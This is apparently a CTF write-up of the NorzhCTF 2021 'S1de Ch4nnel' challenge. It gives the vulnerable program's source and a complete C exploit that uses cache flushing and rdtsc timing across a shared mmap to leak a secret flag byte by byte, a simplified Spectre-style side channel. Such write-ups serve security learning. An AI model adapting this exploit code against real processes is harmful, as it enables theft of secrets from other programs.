---
title: CTF WriteUp - NorzhCTF - S1de Ch4nnel
author: Richard
date: 2021-05-25 11:33:00 +0000
categories: [Exploit development]
tags: [CTF, WriteUp, Side Channel, Spectre]
math: true
mermaid: true
image:
---
## Introduction
---
 
S1de Ch4nnel was a challenge at [NorzhCTF 2021](https://ctftime.org/event/1301).

![](/assets/img/norzh_sidechannel/challenge_description.png)

You can download the challenge [here](/assets/files/NORZH/challenge.tar.gz) and my commented solution 
[there](/assets/files/NORZH/xpl.c).

## Challenge presentation
---

When we ssh into the machine we are given a binary `chall` and the corresponding code `main.c`:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>

#define PAGE_SIZE 512

#define FLAG_SIZE 28

#define DEBUG 0

const char the_array[] = { [0 ... 256 * PAGE_SIZE] = 1 };

const size_t baby_array_size = 16;

static char secret_value[64];

static char baby_array[] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16
};

int victim_function (size_t x)
{
    int y = 0;
    if (x < 100) {
        y = the_array[baby_array[x] * PAGE_SIZE];
    }
    return y;
}

int main (void)
{
    for (size_t i = 0; i < baby_array_size; i++) {
        baby_array[i] = i;
    }

    FILE *fp = fopen("./flag.txt", "r");
    if (fp == NULL)
    {
        perror("Error while opening the file.\n");
        exit(EXIT_FAILURE);
    }
    fgets(secret_value, FLAG_SIZE, fp);


    if(DEBUG){
        printf("Flag : %s\n", secret_value);
        printf("Baby_array to secret_value offset is %d\n", (size_t) (secret_value - baby_array));
    }

    char buffer[64];
    size_t x;
    int i;
    int nb_read;

    /* Make the access to the secret value faster*/
    __asm__ volatile("lea %0, %%rax\n"
                     "movb (%%rax), %%al\n" ::"m"(secret_value)
                     :);

    while (1)
    {
        memset (buffer, '\0', 64);
        printf ("Please give me an int : \n");

        i = 0;
        while (i < 4) {
            nb_read = read (STDIN_FILENO, &buffer[i], 1);
            if (nb_read == -1) {
                exit(1);
            }
            if (nb_read == 0) {
                return 0;
            }
            if (buffer[i] == '\n') {
                break;
            }
            i++;
        }
        x = (size_t) strtoul (buffer, NULL, 10);
        x = victim_function (x);
    }
    return 0;
}

```

The program starts by initializing a few global arrays:
- `secret_value`, in which the flag is later copied
- `baby_array`, a small array of 16 chars 
- `the_array`, a 256 pages long array initialized with all ones


The program then enters a loop where it prompts us for an int and calls the `victim_function` 
with the provided value `x` as the argument.

This function simply accesses `the_array[baby_array[x] * PAGE_SIZE]` and then returns. 
There is an obvious out of bounds access as `baby_array` is only of length 16 while `x` is allowed to be up to 100.

To see how we might exploit this, let's check what lies after `baby_array` in memory:

![](/assets/img/norzh_sidechannel/memory_layout.png)

Sure enough, the flag is close by. Specifically, it starts 48 bytes after
the beginning of `baby_array`. 

## Exploitation strategy
--- 

If you want more details I recommend reading [the original Spectre article](https://spectreattack.com/spectre.pdf) 
as this is pretty much a simplified version of the attack
(without relying on speculative execution). 

We start by flushing all the pages of `the_array` out of the cache then
ask the program to access `the_array[baby_array[48] * PAGE_SIZE]`.
Remember that `baby_array[48]` is the first byte of the flag.
Let's say it's an 'N' which is ascii 78, this means that the page 78 of `the_array` will
be placed in cache.
We then measure the access times to `the_array[i * PAGE_SIZE]` for 
`i` between 0 and 255.
Accessing `the_array[78 * PAGE_SIZE]` should be faster than the others since it is 
a cache hit.  

Therefore, by measuring those timings we can deduce the value of `baby_array[48]` 
and which is the first byte of the flag. 
Repeating this `FLAG_SIZE` times we leak the whole flag. 

## Cross process Spectre attack
---

But how do we access and time `the_array[i * PAGE_SIZE]` for arbitrary values of `i`?

Remember that `the_array` is an initialized const variable so it is placed in the .rodata section of the binary.
![](/assets/img/norzh_sidechannel/the_array_rodata.png)
If we mmap the `chall` binary file in the attacker process' address space and execute 
`chall` at the same time, this memory will be shared. This means that it is backed by the same
physical RAM and subject to the same cache hits / misses in both processes. This allows us 
to do the measurements from the attacker process.


## Exploit code 
---
```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <x86intrin.h>

#define PAGE_SIZE 512
#define FLAG_SIZE 28

// Might need to change this depending on your 'chall' binary
#define CHALL_FILE_SIZE 0x24ec8
// objdump -d ./chall -j .rodata | grep "the_array"
#define OFFSET_TO_THE_ARRAY 0x2020

const char *the_array;

static void *map_file(const char *file) {
    int fd = open(file, O_RDONLY, 0666);
        if (fd < 0){
        printf("Failed to open file");
        return NULL;
    }
    char *mem = mmap(NULL, CHALL_FILE_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    if (mem == MAP_FAILED) { perror("mmap"); exit(-1); }
    return mem;
}

void access_value(char x) {
    /* Wrapper to prevent optimizations */
    (void)x;
}

/* Measure the access time to the_array[i * PAGE_SIZE]
 * for i in [0, 255] and return the value of i corresponding
 * to the shortest access time
 */
char get_min_access_time() {
    char best_candidate = 0;
    int min_time = 99999;
    for(int j = 0; j <= 255; j++) {
        // Access in 'random' order to prevent stride optimization
        // which can  distort the timing results
        int i = ((j * 167) + 13) & 0xff;
        //int i = j;

                int before, after;

        before = __rdtsc();
        access_value(the_array[i * PAGE_SIZE]);
        _mm_lfence(); // Makes sure 'after' is measured when 'access_value' is done
        after = __rdtsc();

        uint32_t diff = (uint32_t)(after-before);

        // For some reason the leak is less accurate without the following line
        fprintf(stderr, "Access time : %c : %d\n", i, diff);

        if(diff < min_time){
            min_time = diff;
            best_candidate = i;
        }
    }
    return best_candidate;
}

/* Leak the char at baby_array[index].
 * We do it 10 times and return the char with highest score
 */
char leak_char(int index){

    uint8_t scores[256] = {0};

    for(int i = 0; i < 10; i++){
        // Flush the cache
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(the_array + j * PAGE_SIZE));
        }

        // Make the victim access the_array[baby_array[index] * PAGE_SIZE]
        char buf[4];
        sprintf(buf, "%2d\n", index);
        write (STDOUT_FILENO, buf, 3);
        scores[get_min_access_time()]++;
    }

    // Find the char with max score
    char leaked_char = 0;
    uint8_t highest_score = 0;
    for(int i = 0; i < 256; i++){
        if(scores[i] > highest_score){
            highest_score = scores[i];
            leaked_char = i;
        }
    }

    return leaked_char;
}

int main(int argc, char *const argv[]) {

    nice(1); // Give a higher priority to the attacker process.
    char leaked_flag [FLAG_SIZE + 1] = {0};

        the_array = (const char *) (map_file("./chall") + OFFSET_TO_THE_ARRAY);

    for(int i = 0; i < FLAG_SIZE; i++){
        leaked_flag [i] = leak_char(i + 48);
    }

    fprintf(stderr, "\nLeaked flag : %s\n",leaked_flag);
    return 0;
}
```
Here is the final result: 

![](/assets/img/norzh_sidechannel/leaked_flag_top.png)

## References 
---
[https://beta.hackndo.com/construction-poc-spectre/](https://beta.hackndo.com/construction-poc-spectre/)
[https://spectreattack.com/spectre.pdf](https://spectreattack.com/spectre.pdf)
